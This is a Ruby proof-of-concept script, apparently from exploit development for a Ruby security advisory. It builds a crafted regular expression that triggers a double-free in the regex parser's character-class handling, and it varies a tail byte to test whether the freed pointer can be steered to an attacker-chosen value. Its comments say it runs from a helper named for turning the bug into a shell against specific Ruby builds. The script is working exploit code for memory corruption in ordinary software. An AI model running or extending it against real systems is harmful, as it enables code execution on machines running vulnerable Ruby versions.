#!/usr/bin/env ruby
# GHSA-7x2q-68qv-6p8x secondary lane: chosen-pointer steering probe.
#
# parse_char_class frees cc->mbuf on && (regparse.c:4977), leaves the pointer
# live, and the error path frees it again (:5072). The tail character is the
# only value varied here: if the stale BBuf's first qword is attacker-chosen,
# the invalid pointer consumed by bbuf_free should track the tail byte.
# Run via ruby2shell-uaf-steer.sh against the plain 3.4.12/3.4.13 builds.
$stdout.sync = true
tail = ARGV.fetch(0)
chars = (0...9999).map { |i| (0x4e00 + 2 * i).chr("UTF-8") }.join
cc = "[[:^ascii:][^#{chars}]&&[^\\u9fff]&&#{tail}]"
begin
  Regexp.new(cc, Regexp::IGNORECASE)
  puts "NOERROR"
rescue RegexpError
  puts "REGEXPERROR"
end
